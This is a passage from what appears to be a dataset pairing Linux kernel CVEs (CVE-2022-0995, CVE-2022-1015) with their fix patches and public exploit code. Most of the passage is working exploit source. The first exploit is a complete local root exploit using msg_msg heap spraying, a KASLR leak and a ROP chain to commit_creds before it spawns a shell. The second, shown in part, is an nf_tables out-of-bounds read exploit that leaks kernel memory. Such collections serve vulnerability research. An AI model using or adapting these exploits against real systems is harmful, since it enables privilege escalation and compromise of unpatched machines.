 		trace_cachefiles_vfs_error(NULL, d_inode(dentry), ret,
 					   cachefiles_trace_setxattr_error);
@@ -209,6 +222,7 @@ bool cachefiles_set_volume_xattr(struct cachefiles_volume *volume)
 					       cachefiles_coherency_vol_set_ok);
 	}
 
+	kfree(buf);
 	_leave("" = %d"", ret);
 	return ret == 0;
 }
@@ -218,7 +232,7 @@ bool cachefiles_set_volume_xattr(struct cachefiles_volume *volume)
  */
 int cachefiles_check_volume_xattr(struct cachefiles_volume *volume)
 {
-	struct cachefiles_xattr *buf;
+	struct cachefiles_vol_xattr *buf;
 	struct dentry *dentry = volume->dentry;
 	unsigned int len = volume->vcookie->coherency_len;
 	const void *p = volume->vcookie->coherency;
@@ -228,6 +242,7 @@ int cachefiles_check_volume_xattr(struct cachefiles_volume *volume)
 
 	_enter("""");
 
+	len += sizeof(*buf);
 	buf = kmalloc(len, GFP_KERNEL);
 	if (!buf)
 		return -ENOMEM;
@@ -245,7 +260,9 @@ int cachefiles_check_volume_xattr(struct cachefiles_volume *volume)
 					""Failed to read xattr with error %zd"", xlen);
 		}
 		why = cachefiles_coherency_vol_check_xattr;
-	} else if (memcmp(buf->data, p, len) != 0) {
+	} else if (buf->reserved != cpu_to_be32(0)) {
+		why = cachefiles_coherency_vol_check_resv;
+	} else if (memcmp(buf->data, p, len - sizeof(*buf)) != 0) {
 		why = cachefiles_coherency_vol_check_cmp;
 	} else {
 		why = cachefiles_coherency_vol_check_ok;
diff --git a/fs/pipe.c b/fs/pipe.c
index cc28623a67b614..2667db9506e2f2 100644
--- a/fs/pipe.c
+++ b/fs/pipe.c
@@ -253,7 +253,8 @@ pipe_read(struct kiocb *iocb, struct iov_iter *to)
 	 */
 	was_full = pipe_full(pipe->head, pipe->tail, pipe->max_usage);
 	for (;;) {
-		unsigned int head = pipe->head;
+		/* Read ->head with a barrier vs post_one_notification() */
+		unsigned int head = smp_load_acquire(&pipe->head);
 		unsigned int tail = pipe->tail;
 		unsigned int mask = pipe->ring_size - 1;
 
@@ -831,10 +832,8 @@ void free_pipe_info(struct pipe_inode_info *pipe)
 	int i;
 
 #ifdef CONFIG_WATCH_QUEUE
-	if (pipe->watch_queue) {
+	if (pipe->watch_queue)
 		watch_queue_clear(pipe->watch_queue);
-		put_watch_queue(pipe->watch_queue);
-	}
 #endif
 
 	(void) account_pipe_buffers(pipe->user, pipe->nr_accounted, 0);
@@ -844,6 +843,10 @@ void free_pipe_info(struct pipe_inode_info *pipe)
 		if (buf->ops)
 			pipe_buf_release(pipe, buf);
 	}
+#ifdef CONFIG_WATCH_QUEUE
+	if (pipe->watch_queue)
+		put_watch_queue(pipe->watch_queue);
+#endif
 	if (pipe->tmp_page)
 		__free_page(pipe->tmp_page);
 	kfree(pipe->bufs);
diff --git a/include/linux/watch_queue.h b/include/linux/watch_queue.h
index c994d1b2cdbaa2..3b9a40ae8bdba7 100644
--- a/include/linux/watch_queue.h
+++ b/include/linux/watch_queue.h
@@ -28,7 +28,8 @@ struct watch_type_filter {
 struct watch_filter {
 	union {
 		struct rcu_head	rcu;
-		unsigned long	type_filter[2];	/* Bitmask of accepted types */
+		/* Bitmask of accepted types */
+		DECLARE_BITMAP(type_filter, WATCH_TYPE__NR);
 	};
 	u32			nr_filters;	/* Number of filters */
 	struct watch_type_filter filters[];
diff --git a/include/trace/events/cachefiles.h b/include/trace/events/cachefiles.h
index c6f5aa74db89b4..2c530637e10aec 100644
--- a/include/trace/events/cachefiles.h
+++ b/include/trace/events/cachefiles.h
@@ -56,6 +56,7 @@ enum cachefiles_coherency_trace {
 	cachefiles_coherency_set_ok,
 	cachefiles_coherency_vol_check_cmp,
 	cachefiles_coherency_vol_check_ok,
+	cachefiles_coherency_vol_check_resv,
 	cachefiles_coherency_vol_check_xattr,
 	cachefiles_coherency_vol_set_fail,
 	cachefiles_coherency_vol_set_ok,
@@ -139,6 +140,7 @@ enum cachefiles_error_trace {
 	EM(cachefiles_coherency_set_ok,		""SET ok  "")		\
 	EM(cachefiles_coherency_vol_check_cmp,	""VOL BAD cmp "")		\
 	EM(cachefiles_coherency_vol_check_ok,	""VOL OK      "")		\
+	EM(cachefiles_coherency_vol_check_resv,	""VOL BAD resv"")	\
 	EM(cachefiles_coherency_vol_check_xattr,""VOL BAD xatt"")		\
 	EM(cachefiles_coherency_vol_set_fail,	""VOL SET fail"")		\
 	E_(cachefiles_coherency_vol_set_ok,	""VOL SET ok  "")
diff --git a/kernel/watch_queue.c b/kernel/watch_queue.c
index 9c9eb20dd2c500..00703444a21948 100644
--- a/kernel/watch_queue.c
+++ b/kernel/watch_queue.c
@@ -54,6 +54,7 @@ static void watch_queue_pipe_buf_release(struct pipe_inode_info *pipe,
 	bit += page->index;
 
 	set_bit(bit, wqueue->notes_bitmap);
+	generic_pipe_buf_release(pipe, buf);
 }
 
 // No try_steal function => no stealing
@@ -112,7 +113,7 @@ static bool post_one_notification(struct watch_queue *wqueue,
 	buf->offset = offset;
 	buf->len = len;
 	buf->flags = PIPE_BUF_FLAG_WHOLE;
-	pipe->head = head + 1;
+	smp_store_release(&pipe->head, head + 1); /* vs pipe_read() */
 
 	if (!test_and_clear_bit(note, wqueue->notes_bitmap)) {
 		spin_unlock_irq(&pipe->rd_wait.lock);
@@ -219,7 +220,6 @@ long watch_queue_set_size(struct pipe_inode_info *pipe, unsigned int nr_notes)
 	struct page **pages;
 	unsigned long *bitmap;
 	unsigned long user_bufs;
-	unsigned int bmsize;
 	int ret, i, nr_pages;
 
 	if (!wqueue)
@@ -243,7 +243,8 @@ long watch_queue_set_size(struct pipe_inode_info *pipe, unsigned int nr_notes)
 		goto error;
 	}
 
-	ret = pipe_resize_ring(pipe, nr_notes);
+	nr_notes = nr_pages * WATCH_QUEUE_NOTES_PER_PAGE;
+	ret = pipe_resize_ring(pipe, roundup_pow_of_two(nr_notes));
 	if (ret < 0)
 		goto error;
 
@@ -258,17 +259,15 @@ long watch_queue_set_size(struct pipe_inode_info *pipe, unsigned int nr_notes)
 		pages[i]->index = i * WATCH_QUEUE_NOTES_PER_PAGE;
 	}
 
-	bmsize = (nr_notes + BITS_PER_LONG - 1) / BITS_PER_LONG;
-	bmsize *= sizeof(unsigned long);
-	bitmap = kmalloc(bmsize, GFP_KERNEL);
+	bitmap = bitmap_alloc(nr_notes, GFP_KERNEL);
 	if (!bitmap)
 		goto error_p;
 
-	memset(bitmap, 0xff, bmsize);
+	bitmap_fill(bitmap, nr_notes);
 	wqueue->notes = pages;
 	wqueue->notes_bitmap = bitmap;
 	wqueue->nr_pages = nr_pages;
-	wqueue->nr_notes = nr_pages * WATCH_QUEUE_NOTES_PER_PAGE;
+	wqueue->nr_notes = nr_notes;
 	return 0;
 
 error_p:
@@ -320,7 +319,7 @@ long watch_queue_set_filter(struct pipe_inode_info *pipe,
 		    tf[i].info_mask & WATCH_INFO_LENGTH)
 			goto err_filter;
 		/* Ignore any unknown types */
-		if (tf[i].type >= sizeof(wfilter->type_filter) * 8)
+		if (tf[i].type >= WATCH_TYPE__NR)
 			continue;
 		nr_filter++;
 	}
@@ -336,7 +335,7 @@ long watch_queue_set_filter(struct pipe_inode_info *pipe,
 
 	q = wfilter->filters;
 	for (i = 0; i < filter.nr_filters; i++) {
-		if (tf[i].type >= sizeof(wfilter->type_filter) * BITS_PER_LONG)
+		if (tf[i].type >= WATCH_TYPE__NR)
 			continue;
 
 		q->type			= tf[i].type;
@@ -371,6 +370,7 @@ static void __put_watch_queue(struct kref *kref)
 
 	for (i = 0; i < wqueue->nr_pages; i++)
 		__free_page(wqueue->notes[i]);
+	bitmap_free(wqueue->notes_bitmap);
 
 	wfilter = rcu_access_pointer(wqueue->filter);
 	if (wfilter)
@@ -566,7 +566,7 @@ void watch_queue_clear(struct watch_queue *wqueue)
 	rcu_read_lock();
 	spin_lock_bh(&wqueue->lock);
 
-	/* Prevent new additions and prevent notifications from happening */
+	/* Prevent new notifications from being stored. */
 	wqueue->defunct = true;
 
 	while (!hlist_empty(&wqueue->watches)) {",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=93ce93587d36493f2f86921fa79921b3cba63fbb,"#define _GNU_SOURCE
#include <sys/ioctl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/watch_queue.h>

#include ""util.h""

#define MSGMSG_SPRAY 2000
#define MSGMSG_FREE_IDX_0 0
#define MSGMSG_FREE_IDX_1 1950
#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42
#define MTYPE_FAKE 0x43
#define PRIMARY_SIZE 96
#define SECONDARY_SIZE 1024
#define N_SOCKS 4
#define N_SKBUFFS 128
#define NUM_PIPEFDS 256
#define CORRUPT_MSGMSG_TRIES 50

void shell();

// Ubuntu kernel 5.13.0-37-generic
// 0xffffffff813c6866 : push rsi ; mov edx, 0x415b00c3 ; pop rsp ; pop rbp ; ret
uint64_t PUSH_RSI_POP_RSP_RBP_RET = 0xffffffff813c6866 - 0xffffffff81000000; 
// 0xffffffff8109507d: pop r12; pop r15; ret; 
uint64_t POP_POP_RET = 0xffffffff8109507d - 0xffffffff81000000;
// 0xffffffff81095080: pop rdi; ret; 
uint64_t POP_RDI_RET = 0xffffffff81095080 - 0xffffffff81000000;
// 0xffffffff81509a39: xor dh, dh; ret; 
uint64_t XOR_DH_DH_RET = 0xffffffff81509a39 - 0xffffffff81000000;
// 0xffffffff815c0d54: mov rdi, rax; jne 0x7c0d41; xor eax, eax; ret; 
uint64_t MOV_RDI_RAX_JNE_RET = 0xffffffff815c0d54 - 0xffffffff81000000;
uint64_t KPTI_TRAPOLINE_POP_RAX_RDI_SWAPGS_IRETQ = 0xffffffff81e0100b - 0xffffffff81000000;
uint64_t PREPARE_KERNEL_CRED = 0xffffffff810d45d0 - 0xffffffff81000000;
uint64_t COMMIT_CREDS = 0xffffffff810d4370 - 0xffffffff81000000;
uint64_t ANON_PIPE_BUF_OPS = 0xffffffff8223ffc0 - 0xffffffff81000000;

uint64_t user_cs, user_ss, user_sp, user_rflags, user_rip = (uint64_t)shell;
uint64_t kaslr_base = -1;

typedef struct watch_notification_type_filter wntf_t;
typedef struct watch_notification_filter wnf_t;

int spray_qids[MSGMSG_SPRAY];
int ss[N_SOCKS][2];
int pipe_fds[NUM_PIPEFDS][2];

unsigned int real_idx = -1, corrupted_idx = -1;

/*
  spray using msg_msg
*/
void spray_msgmsg() {
  char buffer[0x2000] = {0};
  msg *message = (msg *)buffer;

  for (int i = 0; i < MSGMSG_SPRAY; i++) {
    int spray = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    spray_qids[i] = spray;
    memset(buffer, 0x42, sizeof(buffer));

    ((unsigned long*)message->mtext)[0] = i;
    ((unsigned long*)message->mtext)[5] = 0x0; // later this will probably be a msg_msgseg.next, we want it 0x0

    message->mtype = MTYPE_PRIMARY;
    send_msg(spray, message, PRIMARY_SIZE - 0x30, 0); // Each queue has 1 96 and 1 1024 msg_msg

    if(i == MSGMSG_FREE_IDX_0 || i == MSGMSG_FREE_IDX_1) 
      continue;

    message->mtype = MTYPE_SECONDARY;
    send_msg(spray, message, SECONDARY_SIZE - 0x30, 0); // queue --next-> 96 --next-> 1024 <-queue--
  }
}

void delete_msgmsg(int i, int sz, long mtype) {
  char buf[0x2000] = {0};
  get_msg(spray_qids[i], buf, sz - 0x30, mtype, IPC_NOWAIT);
}

void check_corruption() {
  char buf[0x2000] = {0};
  msg *message = (msg *)buf;

  for (int i = 0; i < MSGMSG_SPRAY; i++) {
    if(i == MSGMSG_FREE_IDX_0 || i == MSGMSG_FREE_IDX_1) 
      continue;

    get_msg(spray_qids[i], buf, SECONDARY_SIZE - 0x30, 1, MSG_COPY|IPC_NOWAIT); 

    if (((uint64_t*)message->mtext)[0] != i) {
      real_idx = i;
      corrupted_idx = ((uint64_t*)message->mtext)[0];
      break;
    }
  }
}

void cleanup_msgmsg() {
  for (int i = 0; i < MSGMSG_SPRAY; i++) {
    if(i == MSGMSG_FREE_IDX_0 || i == MSGMSG_FREE_IDX_1 || i == real_idx || i == corrupted_idx) 
      continue;

    msgctl(spray_qids[i], IPC_RMID, NULL);
  }
}
/* */

/*
  kmalloc-1024 spray using skbuff
*/
int spray_skbuff(int ss[N_SOCKS][2], const void *buf, size_t size) {
  for (int i = 0; i < N_SOCKS; i++) {
    for (int j = 0; j < N_SKBUFFS; j++) {
      if (write(ss[i][0], buf, size) < 0) {
        perror(""[-] write"");
        return -1;
      }
    }
  }
  return 0;
}

int free_skbuff(int ss[N_SOCKS][2], void *buf, size_t size) {
  for (int i = 0; i < N_SOCKS; i++) {
    for (int j = 0; j < N_SKBUFFS; j++) {
      if (read(ss[i][1], buf, size) < 0) {
        perror(""[-] read"");
        return -1;
      }
    }
  }
  return 0;
}
/* */

void build_msgmsg(void* msg, uint64_t list_next, uint64_t list_prev, uint64_t next, uint64_t m_ts, uint64_t security, uint64_t mtype) {
  ((msg_msg*)msg)->m_list_next = list_next;
  ((msg_msg*)msg)->m_list_prev = list_prev;
  ((msg_msg*)msg)->next = next;
  ((msg_msg*)msg)->m_ts = m_ts;
  ((msg_msg*)msg)->security = security;
  ((msg_msg*)msg)->m_type = mtype;
}

void build_rop(uint64_t* rop) {
  int k = 0;
  rop[k++] = 0x0;         // dummy rbp
  rop[k++] = POP_POP_RET + kaslr_base; // skip pipe_buf->ops
  rop[k++] = 0x0;         // pipe_buf->ops
  rop[k++] = 0x0;         // dummy
  rop[k++] = POP_RDI_RET + kaslr_base;
  rop[k++] = 0x0;         // rdi
  rop[k++] = PREPARE_KERNEL_CRED + kaslr_base;
  rop[k++] = XOR_DH_DH_RET + kaslr_base;
  rop[k++] = MOV_RDI_RAX_JNE_RET + kaslr_base;
  rop[k++] = COMMIT_CREDS + kaslr_base;
  rop[k++] = KPTI_TRAPOLINE_POP_RAX_RDI_SWAPGS_IRETQ + kaslr_base;
  rop[k++] = 0x0;         // rax
  rop[k++] = 0x0;         // rdi
  rop[k++] = user_rip;    // user_rip
  rop[k++] = user_cs;     // user_cs
  rop[k++] = user_rflags; // user_rflags
  rop[k++] = user_sp;     // user_sp
  rop[k++] = user_ss;     // user_ss
}

void shell() {
  syscall(SYS_execve, ""/bin/sh"", 0, 0);
}

void save_state() {
  __asm__(
    "".intel_syntax noprefix;""
    ""mov user_cs, cs;""
    ""mov user_ss, ss;""
    ""mov user_sp, rsp;""
    ""pushf;""
    ""pop user_rflags;""
    "".att_syntax;""
  );
}

int main() {
  // Assign to cpu 0
  cpu_set_t my_set;
  CPU_ZERO(&my_set);
  CPU_SET(0, &my_set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set) == -1) {
    perror(""sched_setaffinity()"");
    exit(1);
  }

  save_state();

  int fds[2];
  int nfilters = 4;
  char buf[0x2000];
  char secondary_buf[SECONDARY_SIZE - 0x140];

  // Filter setup
  wnf_t *filter = (wnf_t*)calloc(1, sizeof(wnf_t) + nfilters * sizeof(wntf_t));
  if (!filter) {
    perror(""calloc()"");
    exit(1);
  }

  /*
    STEP 1
    Spray msg_msg: for each queue one msg in kmalloc-96 and one in kmalloc-1024
    Corrupt a msg_msg.mlist.next in kmalloc-96, so that two msg_msg points to the same msg_msg in kmalloc-1024
  */
  puts(""[+] STEP 1: msg_msg corruption"");

  int ntries = 0;

  do {
    ntries++;

    filter->nr_filters = nfilters;
    for (int i = 0; i < (nfilters - 1); i++) {  // choose kmalloc-96
      filter->filters[i].type = 1;
    }

    // Set 1 bit oob to 1, hopefully we overwrite a msg_msg.mlist.next which is not 2k aligned
    filter->filters[nfilters - 1].type = 0x30a; // 0x300 -> 96 bytes oob, 0xa -> 2**10 == 1024

    if (pipe2(fds, O_NOTIFICATION_PIPE) == -1) {
      perror(""pipe2()"");
      exit(1);
    }

    // Spray kmalloc-96
    spray_msgmsg();
    delete_msgmsg(MSGMSG_FREE_IDX_1, PRIMARY_SIZE, MTYPE_PRIMARY); // kmalloc
    delete_msgmsg(MSGMSG_FREE_IDX_0, PRIMARY_SIZE, MTYPE_PRIMARY); // memdup

    // Filter go
    if (ioctl(fds[0], IOC_WATCH_QUEUE_SET_FILTER, filter) < 0) {
      perror(""ioctl(IOC_WATCH_QUEUE_SET_FILTER)"");
      goto err;
    }

    check_corruption();

    if (corrupted_idx != -1)
      break;
    
    cleanup_msgmsg();
  } while (ntries < CORRUPT_MSGMSG_TRIES);

  if (corrupted_idx == -1) {
    puts(""[-] couldn't corrupt msg_msg"");
    exit(1);
  }

  printf(""[*] found corrupted msg_msg after %d tries. real: %d corrupted: %d\n"", ntries, real_idx, corrupted_idx);
  puts(""[+] freeing corrupted msg_msg...."");
  delete_msgmsg(corrupted_idx, SECONDARY_SIZE, MTYPE_SECONDARY);

  for (int i = 0; i < N_SOCKS; i++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
      perror(""[-] socketpair"");
      goto err;
    }
  }

  memset(secondary_buf, 0x42, sizeof(secondary_buf));
  build_msgmsg(secondary_buf, 0x4141414141414141, 0x4242424242424242, 0x0, 8192 - 0x30, 0x0, MTYPE_FAKE);

  puts(""[+] reallocating corrupted msg_msg...."");
  spray_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  memset(buf, 0x0, sizeof(buf));
  get_msg(spray_qids[real_idx], buf, 8192-0x30, 1, IPC_NOWAIT | MSG_COPY);

  uint64_t primary_msg = ((uint64_t*)buf)[124];
  if ((primary_msg & 0xffff000000000000) != 0xffff000000000000) {
    puts(""[-] wrong heap leak"");
    goto err;
  }
  printf(""[*] primary_msg: 0x%lx\n"", primary_msg);

  puts(""[+] freeing corrupted msg_msg...."");
  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  memset(secondary_buf, 0x42, sizeof(secondary_buf));
  build_msgmsg(secondary_buf, 0x4141414141414141, 0x4242424242424242, primary_msg - 8, 8192 - 0x30, 0x0, MTYPE_FAKE);

  puts(""[+] reallocating corrupted msg_msg...."");
  spray_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  memset(buf, 0x0, sizeof(buf));
  get_msg(spray_qids[real_idx], buf, 8192-0x30, 1, IPC_NOWAIT | MSG_COPY);

  uint64_t secondary_msg = ((uint64_t*)buf)[507];
  if ((secondary_msg & 0xffff000000000000) != 0xffff000000000000) {
    puts(""[-] wrong heap leak"");
    goto err;
  }
  printf(""[*] secondary_msg: 0x%lx\n"", secondary_msg);

  uint64_t fake_secondary_msg = secondary_msg - SECONDARY_SIZE;
  printf(""[*] corrupted secondary_msg: 0x%lx\n"", fake_secondary_msg);
  puts(""[+] freeing corrupted msg_msg...."");
  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  build_msgmsg(secondary_buf, fake_secondary_msg, fake_secondary_msg, 0x0, SECONDARY_SIZE - 0x30, 0x0, MTYPE_FAKE);

  puts(""[+] reallocating corrupted msg_msg...."");
  spray_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  puts(""[+] freeing sk_buff...."");
  delete_msgmsg(real_idx, SECONDARY_SIZE, MTYPE_FAKE);

  /*
    STEP 2
    Spray struct pipe_buffer, leak KASLR while reading and freeing sk_buffs
  */
  puts(""[+] STEP 2: KASLR leak"");
  puts(""[+] Spraying pipe_buffer objs..."");

  for (int i = 0; i < NUM_PIPEFDS; i++) {
    if (pipe(pipe_fds[i]) < 0) {
      perror(""[-] pipe"");
      goto err;
    }

    if (write(pipe_fds[i][1], ""A"", 1) < 0) {
      perror(""[-] write"");
      goto err;
    }
  }

  puts(""[+] Leak+free pipe_buffer objs..."");
  memset(secondary_buf, 0x0, sizeof(secondary_buf));  

  for (int i = 0; i < N_SOCKS; i++) {
    for (int j = 0; j < N_SKBUFFS; j++) {
      if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0) {
        perror(""[-] read"");
        goto err;
      }

      if (*(uint64_t *)&secondary_buf[0x10] != MTYPE_FAKE)
        kaslr_base = ((uint64_t*)secondary_buf)[2];
    }
  }

  if (kaslr_base == -1 || ((kaslr_base & 0xffffffff00000000) != 0xffffffff00000000)) {
    puts(""[-] couldn't leak kaslr"");
    goto err;
  }

  printf(""[*] kaslr leak: 0x%lx\n"", kaslr_base);
  kaslr_base -= ANON_PIPE_BUF_OPS;
  printf(""[*] kaslr base: 0x%lx\n"", kaslr_base);

  /*
    STEP 3
    Reallocate struct pipe_buffer overwrite _ops pointer and do stack pivoting
  */
  puts(""[+] STEP 3: Stack pivot"");
  puts(""[+] Reallocating pipe_buffer object...."");
  
  struct pipe_buf_operations *ops;
  struct pipe_buffer *pipe_buf;

  memset(secondary_buf, 0x0, sizeof(secondary_buf));

  pipe_buf = (struct pipe_buffer*)secondary_buf;
  ops = (struct pipe_buf_operations *)&secondary_buf[0x290];
  ops->release = PUSH_RSI_POP_RSP_RBP_RET + kaslr_base;

  build_rop((uint64_t*)secondary_buf);

  pipe_buf->ops = fake_secondary_msg + 0x290;

  spray_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  puts(""[+] Cleaning up msg_msgs"");
  cleanup_msgmsg();

  puts(""[+] Releasing pipe_buffer objs"");
  for (int i = 0; i < NUM_PIPEFDS; i++) {
    if (close(pipe_fds[i][0]) < 0) {
      perror(""[-] close"");
      goto err;
    }
    if (close(pipe_fds[i][1]) < 0) {
      perror(""[-] close"");
      goto err;
    }
  }

  return 0;

err:
  cleanup_msgmsg();
  return 1;
}

",https://github.com/Bonfee/CVE-2022-0995/tree/main,,,
CVE-2022-1015,https://www.opencve.io/cve/CVE-2022-1015,A flaw was found in the Linux kernel in linux/net/netfilter/nf_tables_api.c of the netfilter subsystem. This flaw allows a local user to cause an out-of-bounds write issue.,"netfilter: nf_tables: validate registers coming from userspace.
Bail out in case userspace uses unsupported registers.

Fixes: 49499c3e6e18 (""netfilter: nf_tables: switch registers to 32 bit addressing"")
Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
Diffstat
-rw-r--r--	net/netfilter/nf_tables_api.c	22	
1 files changed, 17 insertions, 5 deletions
diff --git a/net/netfilter/nf_tables_api.c b/net/netfilter/nf_tables_api.c
index d71a33ae39b354..1f5a0eece0d14b 100644
--- a/net/netfilter/nf_tables_api.c
+++ b/net/netfilter/nf_tables_api.c
@@ -9275,17 +9275,23 @@ int nft_parse_u32_check(const struct nlattr *attr, int max, u32 *dest)
 }
 EXPORT_SYMBOL_GPL(nft_parse_u32_check);
 
-static unsigned int nft_parse_register(const struct nlattr *attr)
+static unsigned int nft_parse_register(const struct nlattr *attr, u32 *preg)
 {
 	unsigned int reg;
 
 	reg = ntohl(nla_get_be32(attr));
 	switch (reg) {
 	case NFT_REG_VERDICT...NFT_REG_4:
-		return reg * NFT_REG_SIZE / NFT_REG32_SIZE;
+		*preg = reg * NFT_REG_SIZE / NFT_REG32_SIZE;
+		break;
+	case NFT_REG32_00...NFT_REG32_15:
+		*preg = reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00;
+		break;
 	default:
-		return reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00;
+		return -ERANGE;
 	}
+
+	return 0;
 }
 
 /**
@@ -9327,7 +9333,10 @@ int nft_parse_register_load(const struct nlattr *attr, u8 *sreg, u32 len)
 	u32 reg;
 	int err;
 
-	reg = nft_parse_register(attr);
+	err = nft_parse_register(attr, &reg);
+	if (err < 0)
+		return err;
+
 	err = nft_validate_register_load(reg, len);
 	if (err < 0)
 		return err;
@@ -9382,7 +9391,10 @@ int nft_parse_register_store(const struct nft_ctx *ctx,
 	int err;
 	u32 reg;
 
-	reg = nft_parse_register(attr);
+	err = nft_parse_register(attr, &reg);
+	if (err < 0)
+		return err;
+
 	err = nft_validate_register_store(ctx, reg, data, type, len);
 	if (err < 0)
 		return err;",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e1acfa387b9ff82cfc7db8cc3b6959221a95851,"/*
 * ----------------------------------------------------------------------------
 * ""THE BEER-WARE LICENSE"" (Revision 42):
 * David Bouman (pql) wrote this file.  As long as you retain this notice you
 * can do whatever you want with this stuff. If we meet some day, and you think
 * this stuff is worth it, you can buy me a beer in return.   Signed, David.
 * ----------------------------------------------------------------------------
 */

#define _GNU_SOURCE 1
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stddef.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/mman.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#include ""helpers.h""

struct vuln_expr_params {
    uint32_t min_len;
    uint32_t max_len;
    uint32_t value;
};


void setup_nftables(struct mnl_socket* nl, char* table_name, char* base_chain_name, int* seq)
{
    if (create_table(nl, table_name, AF_INET, seq, NULL) == -1) {
        perror(""Failed creating table"");
        exit(EXIT_FAILURE);
    }

    printf(""[+] Created nft %s\n"", table_name);

    struct unft_base_chain_param bp;
    bp.hook_num = NF_INET_LOCAL_OUT;
    bp.prio = 10;

    if (create_chain(nl, table_name, base_chain_name, NFPROTO_IPV4, &bp, seq, NULL)) {
            perror(""Failed creating base chain"");
            exit(EXIT_FAILURE);
    }

    printf(""[+] Created base ipv4 chain %s\n"", base_chain_name);
}

static int calc_vuln_expr_params_div(struct vuln_expr_params* result, uint8_t desired, uint32_t min_len, uint32_t max_len, int shift)
{
    uint64_t base_ = (uint64_t)(1) << (32 - shift);
    uint32_t base = (uint32_t)(base_ - 1);

    if (base == 0xffffffff) {
        base = 0xfffffffb; // max actual value 
    }

    for (;;) {
        uint64_t computed = (base * 4) & 0xffffffff;
        uint64_t max_value = computed + (uint64_t)(max_len);
        if (max_value < ((uint64_t)(1) << 32)) {
            break;
        }

        if ( (base & 0xff) != desired) {
            base--;
            continue;
        }

        uint32_t len_at_least = ((uint64_t)1 << 32) - computed;
        uint32_t len_at_most  = len_at_least + 0x50; 
        
        if (min_len > len_at_least) {
            len_at_least = min_len;
        }

        if (max_len < len_at_most) {
            len_at_most = max_len;
        }
        result->max_len = len_at_most;
        result->min_len = len_at_least;
        result->value = base + 4;
        return 0;

    }
    return -1;

}

static int calc_vuln_expr_params(struct vuln_expr_params *result, uint8_t desired, uint32_t min_len, uint32_t max_len)
{
    
    for (int i = 0; i < 3; ++i) {
        int res = calc_vuln_expr_params_div(result, desired, min_len, max_len, i);
        if (!res) {
            return 0;
        }
    }
    
    return -1;
    
}

#define MAGIC 0xdeadbeef0badc0de
int create_base_chain_rule(struct mnl_socket* nl, char* table_name, char* chain_name, uint16_t family, uint64_t* handle, int* seq)
{

    struct nftnl_rule* r = build_rule(table_name, chain_name, family, handle);

    // we start by adding a rule to fetch the destination port
    // UDP header destination port starts at offset +2 and is 2 bytes long
    // we store the result in register 8
    
    rule_add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, offsetof(struct udphdr, dest), sizeof(uint16_t), 8);

    // if the destination port does not match, the rule will accept the packet. This will save us a lot of noise,
    // including noise generated by packets sent by our server socket.

    // the server sockets actually have a different stack layout than the client sockets in do_chain, so this is essential.

    uint16_t dest_port = htons(9999);
    rule_add_cmp(r, NFT_CMP_EQ, 8, &dest_port, sizeof dest_port);

    // then, we fetch the first 8 bytes of the the inner header.
    // these need to match our magic value, or else the rule will accept the packet.
    // we do this as a failsafe that guarantees we only process packets we 
    // actually want to process.

    rule_add_payload(r, NFT_PAYLOAD_INNER_HEADER, 0, 8, 8);

    uint64_t magic = MAGIC;
    rule_add_cmp(r, NFT_CMP_EQ, 8, &magic, sizeof magic);

    // If the packet passed these checks, we jump to the auxiliary chain

    rule_add_immediate_verdict(r,  NFT_GOTO, ""aux_chain"");

    // Commit rule to the kernel
    return send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, family, (void**)&r, seq,
        NULL
    );
    
}

int create_infoleak_rule(
    struct mnl_socket* nl, struct nftnl_rule* r, uint8_t cmp, uint8_t pos, uint16_t family, int* seq, int extraflags)
{

    struct vuln_expr_params vuln_params;

    // index 0xff translates to +0x3fc, and there's a kernel address that we can grab.

    if (calc_vuln_expr_params(&vuln_params, 0xff,  0x40, 0x40)) {
        puts(""Could not find correct params to trigger OOB read."");
        return -1;
    }

    // we shift by pos*8 so that the first byte of the register will be the one at pos `pos`.
    uint32_t shift_amt = (pos * 8);
    rule_add_bit_shift(r, NFT_BITWISE_RSHIFT, vuln_params.min_len, vuln_params.value, 1, &shift_amt, sizeof shift_amt);
    
    // we compare it to the constant - we can binary search
    
    // if the compared value is greater than our supplied value,
    // we accept the packet. Else, we drop it.

    rule_add_cmp(r, NFT_CMP_GT, 0x15, &cmp, 1);

    rule_add_immediate_verdict(r, NF_DROP, NULL);

    return send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE | extraflags, family, (void**)&r, seq,
        NULL
    );
}

#define INFOLEAK_RULE_HANDLE 4
uint8_t do_leak_byte(struct mnl_socket* nl, int client_sock, struct sockaddr_in* addr, char* table_name, char* aux_chain_name, uint8_t pos, int* seq)
{

    uint8_t low = 0;
    uint8_t high = 255;
    
    uint8_t mid;

    char msg[16] = {};
    char result[16] = {};
    *(uint64_t*)msg = MAGIC;

    for(;;) {
        
        mid = (high + low) / 2;
        
        printf(""bounds (inclusive): [0x%.2hhx, 0x%.2hhx]\n"", low, high);

        if (low == high) {
            return mid;
        }

